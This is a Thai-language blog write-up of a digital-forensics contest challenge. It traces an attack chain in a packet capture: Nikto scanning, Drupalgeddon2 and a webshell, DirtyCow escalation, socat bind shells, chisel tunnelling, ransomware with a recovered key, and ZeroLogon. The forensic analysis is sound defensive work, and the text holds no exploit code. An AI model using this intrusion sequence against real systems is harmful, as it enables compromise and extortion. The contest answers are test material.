![0579af437efc749ce881e52229dad8ab.png](/resources/0579af437efc749ce881e52229dad8ab.png)
```
WindowsUpdate
```

![bec34f660d54807117e4803c742761c3.png](/resources/bec34f660d54807117e4803c742761c3.png)
* * *
## Attack chain in Wireshark traffic dump 
![097d8368e661c85f9ddc2cd214c5cf78.png](/resources/097d8368e661c85f9ddc2cd214c5cf78.png)
มาถึงโจทย์สุดท้ายกันแล้ว ซึ่งจะให้เรามาเป็น pcap file ที่มีขนาดค่อนข้างใหญ่

>What is the address of the attacker's car 

![75359352c27e813939109145eb505ed4.png](/resources/75359352c27e813939109145eb505ed4.png)
เมื่อเปิด pcap ไฟล์ขึ้นมาเราก็จะพบกับ port scanning activity ทันทีซึ่งก็ไม่ต้องสืบถึง IP Address ของ threat actor เลย มันอยู่ตรงหน้าเราแล้ว

```
10.14.200.50
```

>Which packet ended with the initial scanning of the external network. 

![db069ab9a503d10fe9fb3bd0f90c50d1.png](/resources/db069ab9a503d10fe9fb3bd0f90c50d1.png)

ในส่วนนี้ผมก็ filter IP address ของ target ที่โดน port scan แล้วเลื่อนไปท้ายสุดที่มี SYN และ RST, ACK packet คู่สุดท้ายก็จะพบ packet 6016 และ 6017 เป็น packet สุดท้ายที่จบการ scan จาก threat actor IP นี้

```
6017
```

>What tool did the attacker use to scan the web server 

![dea71f457770de8f30ebadfed3f0407e.png](/resources/dea71f457770de8f30ebadfed3f0407e.png)

ซึ่งหลังจากทำ port scan เสร็จ ทางฝั่ง threat actor ก็ได้ข้อมูลมาว่ามี web server รันอยู่บนเครื่องนี้ ดังนั้นเพื่อหาช่องโหว่ของ web server, ทาง threat actor ก็ได้ใช้ well-known web scanner อย่าง Nikto ในการแสกนหาช่องโหว่ต่อเลย ซึ่งรู้ได้ไงว่าเป็น Nikto? ดูจาก User-agent ได้เลยครับ

```
Nikto
```

>What vulnerability did the attacker use to attack 10.14.2.11 

![f6f56393ded678dc5ef938b082f13a2f.png](/resources/f6f56393ded678dc5ef938b082f13a2f.png)

ในเมื่อเรารู้แล้วว่า threat actor ใช้ Nikto ดังนั้นเพื่อ filter noise ออกไปก็ต้องไปเอา user-agent ออก แล้วผมก็ไปโฟกัสที่ HTTP Request ของ threat actor ที่ส่งไปยัง web server แทน ซึ่งก็พบว่ามีการ exploit drupalgeddon2 เกิดขึ้นแล้วทำสำเร็จซะด้วยทำให้ threat actor สามารถ upload webshell และรัน command ผ่าน webshell ได้

ข้อนี้เราจะตอบเป็น CVE Identifier หรือชื่อของช่องโหว่ก็ได้ครับ
```
CVE-2018-7600
```
หรือ `drupalgeddon2`

>What vulnerability did the attacker use to escalate privileges on 10.14.2.11 

![396a3b040cb670c0e519c4c06f3cf262.png](/resources/396a3b040cb670c0e519c4c06f3cf262.png)

ดู request จาก threat actor เพิ่มมาอีกนิดก็จะเห็นว่ามีการ GET request เพื่อขอไฟล์ script ภาษา c, `socat`, `chisel` และ `encr.sh` มาจาก threat actor IP address (เริ่มคุ้นแล้วไหมครับ ใช่แล้ว เหมือนกับ Auditd เลยยังไงหละ)

![a9ee3f9095504f1ff5aa6015a348ce4d.png](/resources/a9ee3f9095504f1ff5aa6015a348ce4d.png)

เมื่อเราเอา header ของ c script ไป search ก็จะพบว่ามันเป็น script สำหรับ exploit [DirtyCow](https://github.com/0x9a/DirtyCow/blob/master/DirtyCow.c) เพื่อทำ privilege escalation นั่นเอง

![851ebc8d1a63aa489a491aa6c7666cff.png](/resources/851ebc8d1a63aa489a491aa6c7666cff.png)

ซึ่งเมื่อส่องตาม webshell command ก็จะพบว่ามีการเปิด port 8080 รอ bind shell connection ด้วย socat 

![793bdc831e3e35bcc7cc484f1da64043.png](/resources/793bdc831e3e35bcc7cc484f1da64043.png)

filter ด้วย `tcp.port == 8080` แล้ว follow tcp stream ก็จะพบว่า threat actor จะเปิด port 8081 เพื่อทำอีก bind shell ด้วยสิทธิ์ root ซึ่งก็จะเห็น DirtyCow ถูก exploit จริง ๆ จาก stream นี้ครับ

```
CVE-2016-5195
```

>What tool did the attacker use to tunnel connections into the internal infrastructure network 

![d3c6050e4c2df2b534eb693ce4f409d6.png](/resources/d3c6050e4c2df2b534eb693ce4f409d6.png)

socat ก็ใช้ไปแล้ว มันก็เหลือแค่ [chisel](https://github.com/jpillora/chisel) แล้วหละ ซึ่งเราสามารถหา connection ที่เกิดจาก chisel ได้ด้วย Info ของ packet ครับ

![84d34f45d76411b364255e8dedd7a349.png](/resources/84d34f45d76411b364255e8dedd7a349.png)

ซึ่งก้จะเห็นว่า threat actor ใช้ Web Socket ในการทำ tunnel ไปยัง internal infrastructure network ของเป้าหมาย

```
chisel
```

>What tool did the attacker use to encrypt files on 10.14.2.11

![9f723fe3231c89220990b2aeca50da7e.png](/resources/9f723fe3231c89220990b2aeca50da7e.png)

เรารู้ว่า threat actor ส่ง encryption script ไปบนเครื่อง 10.14.2.11 เราก็ลองมาอ่านดูซักหน่อยว่ามันทำอะไร 

ซึ่งก็คืออัลกอริทึมเดียวกันที่เราพบใน Auditd log เลยครับ แต่ในที่นี้เราก็จะเห็นข้อความเพิ่มเติมด้วย อย่างเช่นการเพิ่มข้อความลงใน `/etc/motd` เพื่อบอก user เมื่อ login เข้ามาว่าโดน ransom แล้วนะ

```
openssl
```

>What key did the attacker use to encrypt files on the Windows server 

![0d84737c7ecca78cb71c6cfbb0bb6e1c.png](/resources/0d84737c7ecca78cb71c6cfbb0bb6e1c.png)

กลับมาที่ HTTP request อีกครั้ง รอบนี้เรารู้ IP ของ attacker เราก็แค่ต้องหา request ที่ขอ script หรือไฟล์ที่จะรันบน Windows ได้ ซึ่งผมก็เจอ powershell script ที่ถูกส่งมาพร้อมกับ url ที่มี key และ iv แฝงเข้ามาใน path

![459b8c0f4068f5cc67cdc77489376043.png](/resources/459b8c0f4068f5cc67cdc77489376043.png)

ซึ่งเมื่ออ่าน script นี้ดูก็จะพบว่าข้อสันนิษฐานของเราถูกต้องครับ

```
xThizmhZ6SEdI2rvVtjPGPQtmGf/nsjllzsegJOHySY=
```

>Through what vulnerability did the attacker gain access to the domain controller 10.14.3.10 

![5ad02d00a6421c168819aeb4d566e5f4.png](/resources/5ad02d00a6421c168819aeb4d566e5f4.png)

ข้อนี้เราต้อง filter IP ของ domain controller แล้วก็มาดูว่ามี protocol ที่เกี่ยวกับ domain controller ไหนที่ดูแปลก ๆ บ้าง ซึ่งก็ไปเจอ Net Logon ครับ เลยก็ "อะ ฮ่า!" ทันที เพราะช่องโหว่ที่เกี่ยวกับ Net Logon ที่น่าจะรู้จักกันดีก็คือ ZeroLogon ครับ

โดยวิธีการ detect ก็อ่านได้จากเว็บนี้เลย https://arista.my.site.com/AristaCommunity/s/article/Network-Threat-Hunting-for-Zerologon-Exploits-CVE-2020-1472
```
CVE-2020-1472
```

>Write the name of the encryption script 
```
Ransom.ps1
```

![511ffa31bec5847acef140c09586f879.png](/resources/511ffa31bec5847acef140c09586f879.png)
***
## Conclusion
ก็จบไปแล้วครับ สำหรับ Cyber Range Thailand 2024 รอบ Qualifier ซึ่งผมมองว่าเป็นงานที่สนุกสำหรับสาย Blue team เลย ถึงแม้ผมจะแอบไปถามผู้ประชาสัมพันธ์งานมาแล้ว เขาบอกว่าตอนแรกกะจะให้เป็น CTF Jeopardy แต่ด้วยเหตุผลบางประการจึงทำให้รอบนี้เป็นการแข่ง Digital Forensics แทน

![fb6facb380ac91cf457c966fe8f9c5ae.png](/resources/fb6facb380ac91cf457c966fe8f9c5ae.png)

Scoreboard ในตอนจบจะเห็นว่ามี 4 คนได้คะแนนเต็ม แต่รายชื่อของผมตกไปอยู่ลำดับสามของที่ 1 เพราะว่ามันเรียงตามชื่อ แต่ไม่ได้เรียงตาม time solved ครับ

ในทั้งนี้ก็ขอขอบคุณผู้จัดงาน ผู้ที่เกี่ยวข้องทุกท่านแล้วก็ 2600 thailand community ด้วยครับที่ช่วยสร้างสีสันและความบรรเทิงให้กับผมและน้อง ๆ นักศึกษาร่วม 100 ที่ได้ลงแข่งในครั้งนี้

โอกาศหน้าไว้พบกันใหม่ PEACE~
* * *